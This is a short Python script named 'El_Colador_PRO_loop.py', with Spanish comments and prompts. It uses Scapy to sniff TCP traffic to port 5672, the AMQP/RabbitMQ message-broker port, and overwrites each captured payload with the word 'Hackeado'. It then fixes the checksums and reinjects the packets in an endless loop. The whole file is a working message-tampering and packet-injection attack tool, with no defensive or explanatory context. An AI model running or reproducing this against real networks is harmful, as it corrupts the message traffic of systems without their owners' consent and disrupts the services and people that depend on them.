# El_Colador_PRO_loop.py
from scapy.all import *

# Pregunta interfaz
interfaces = get_if_list()
print("Interfaces detectadas:", flush=True)
for i, iface in enumerate(interfaces):
    print(f"  [{i+1}] {iface}", flush=True)
input_str = input("Elige la interfaz por nombre o número (ENTER para 'eth0'): ").strip()
IFACE = "eth0" if input_str == "" else (interfaces[int(input_str) - 1] if input_str.isdigit() and 1 <= int(input_str) <= len(interfaces) else input_str)

FILTER = "tcp dst port 5672 and tcp[tcpflags] & tcp-push != 0"

hack_msg = b"Hackeado"
print(f"[+] El Colador activo en {IFACE}. Sniffing infinito. Ctrl+C para salir.")

enviados = 0
try:
    while True:
        pkts = sniff(filter=FILTER, iface=IFACE, count=1, timeout=10)
        if not pkts:
            continue
        pkt = pkts[0]
        if pkt.haslayer(Raw):
            old = pkt[Raw].load
            if len(hack_msg) > len(old):
                nuevo = hack_msg[:len(old)]
            else:
                nuevo = hack_msg.ljust(len(old), b' ')
            pkt_mod = pkt.copy()
            pkt_mod[Raw].load = nuevo
            # Corrige checksums y longitud
            if pkt_mod.haslayer('IP'):
                del pkt_mod['IP'].chksum
                del pkt_mod['IP'].len
            if pkt_mod.haslayer('TCP'):
                del pkt_mod['TCP'].chksum
            print(f"[+] Paquete modificado y reenviado con payload: {nuevo!r}")
            sendp(pkt_mod, iface=IFACE, verbose=0)
            enviados += 1
except KeyboardInterrupt:
    print(f"\n[!] El Colador finalizado por el usuario. Total reenviados: {enviados}")
